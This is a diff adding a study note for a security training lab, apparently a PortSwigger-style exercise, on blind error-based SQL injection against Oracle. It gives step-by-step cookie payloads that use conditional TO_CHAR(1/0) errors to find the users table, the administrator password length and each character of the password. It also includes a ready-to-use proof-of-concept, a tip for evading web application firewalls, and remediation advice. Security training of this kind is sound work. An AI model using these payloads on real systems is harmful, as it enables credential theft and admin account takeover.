@@ -1580,3 +1580,237 @@ FALSE → Missing “Welcome back”
 Extract → Length → Characters → Login  
 
 ---
+
+# Lab -10 : Blind Error-Based SQL Injection — Extracting Admin Credentials
+
+---
+
+## 🔹 One-line summary
+Blind SQLi using Oracle’s conditional error mechanic (TO_CHAR(1/0)) to extract the administrator password from a tracking cookie.
+
+---
+
+## 🔹 What is this topic? (short)
+Blind SQL Injection where:
+- Output is *not returned*
+- Behavior only changes when an *error is triggered*
+- Oracle lets us trigger controlled errors using:
+  
+  TO_CHAR(1/0)
+  
+We use conditional checks to leak the admin password.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- Full credential extraction  
+- Account takeover (admin)  
+- Database disclosure  
+- Pivoting inside corporate networks  
+- Oracle apps often hide text errors → only subtle behavior differences
+
+---
+
+## 🔹 High-value injection targets
+- Cookies: TrackingId, Session, visitorId
+- Custom headers: X-User, X-Forwarded-For, Device-ID
+- Hidden GET/POST params: id, category, product
+- Login/reset-token fields
+- Sorting/search fields
+
+---
+
+## 🔹 Quick concept checklist
+- TO_CHAR(1/0) throws an error  
+- CASE WHEN <cond> THEN TO_CHAR(1/0)  
+- Error = TRUE  
+- No error = FALSE  
+- Oracle requires:  
+  
+  FROM dual
+  
+
+---
+
+## 🔹 Lab walkthrough — exact steps (copy-paste ready)
+
+### *1️⃣ Confirm SQL injection works*
+
+TrackingId=xyz'
+
+➡️ Application throws an Oracle error → injection confirmed.
+
+
+TrackingId=xyz''
+
+➡️ Error disappears → confirms you are breaking/repairing SQL.
+
+---
+
+### *2️⃣ Confirm database is Oracle*
+Test without dual:
+
+xyz'||(SELECT '')||'
+
+➡️ Error.
+
+Test with dual:
+
+xyz'||(SELECT '' FROM dual)||'
+
+➡️ No error → Oracle confirmed.
+
+---
+
+### *3️⃣ Confirm your injected SQL is executed*
+Call a non-existing table:
+
+xyz'||(SELECT '' FROM badtable)||'
+
+➡️ Error → your SELECT is running server-side.
+
+---
+
+### *4️⃣ Check if users table exists*
+
+xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
+
+➡️ No error → table exists.
+
+---
+
+### *5️⃣ Use Oracle conditional errors (core attack)*
+*TRUE → error*
+
+xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+
+*FALSE → no error*
+
+xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+
+---
+
+### *6️⃣ Check if the administrator user exists*
+
+xyz'||(SELECT CASE WHEN (username='administrator') 
+THEN TO_CHAR(1/0) ELSE '' END FROM users)||'
+
+➡️ Error → admin exists.
+
+---
+
+### *7️⃣ Determine password length*
+Loop N = 1 → 30:
+
+xyz'||(SELECT CASE WHEN LENGTH(password)>N 
+THEN TO_CHAR(1/0) ELSE '' END 
+FROM users WHERE username='administrator')||'
+
+When error stops → length found.  
+(Lab: *20 characters*)
+
+---
+
+### *8️⃣ Extract password character-by-character*
+Template:
+
+xyz'||(SELECT CASE WHEN SUBSTR(password,POS,1)='a' 
+THEN TO_CHAR(1/0) ELSE '' END 
+FROM users WHERE username='administrator')||'
+
+
+Replace 'a' with payload list:  
+a–z, 0–9
+
+Replace POS from 1 → 20.
+
+Error = correct character.
+
+Repeat until full admin password is recovered.
+
+---
+
+### *9️⃣ Log in with extracted admin credentials*
+Use /login → enter extracted password.  
+✔ Lab solved.
+
+---
+
+## 🧾 Proof / Evidence (Screenshot)
+
+![Admin password via error based sqli](../images/admin-password-final.png)  
+*Description:* Final extracted administrator password displayed in Repeater after completing the character-by-character Oracle error-based SQL injection.
+
+---
+
+## 🔹 PoC / Repeater-ready example
+
+Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' 
+THEN TO_CHAR(1/0) ELSE '' END 
+FROM users WHERE username='administrator')||';
+
+
+---
+
+## 🔹 Common payloads & quick cheats
+*Oracle conditional error payload:*
+
+CASE WHEN (<cond>) THEN TO_CHAR(1/0) ELSE '' END
+
+
+*Check admin existence:*
+
+username='administrator'
+
+
+*Password length brute:*
+
+LENGTH(password)>N
+
+
+*Character extraction:*
+
+SUBSTR(password,P,1)='x'
+
+
+---
+
+## 🔹 Troubleshooting
+- *Error always visible* → unbalanced quotes  
+- *No error at all* → missing FROM dual  
+- *Every request errors* → missing ROWNUM=1  
+- *No valid Intruder matches* → wrong grep (use 500)  
+- *WAF blocks keywords* → try case flipping / comment bypass
+
+---
+
+## 🔹 Fixes / remediation
+- Use parameterized queries  
+- Validate all cookie/header input  
+- Remove detailed SQL errors  
+- Use strict allowlists  
+- Hash & HMAC-protect cookies  
+- Apply least-privilege DB users
+
+---
+
+## 🔹 Pentest checklist
+1. Break SQL with '  
+2. Confirm Oracle with FROM dual  
+3. Test conditional errors  
+4. Check users table  
+5. Check admin user  
+6. Get password length  
+7. Extract characters with Intruder  
+8. Log in  
+9. Screenshot → report
+
+---
+
+## 🔹 Quick memory cue
+
+' → dual → CASE WHEN → 1/0 error → length → chars → admin pw.
+
+---
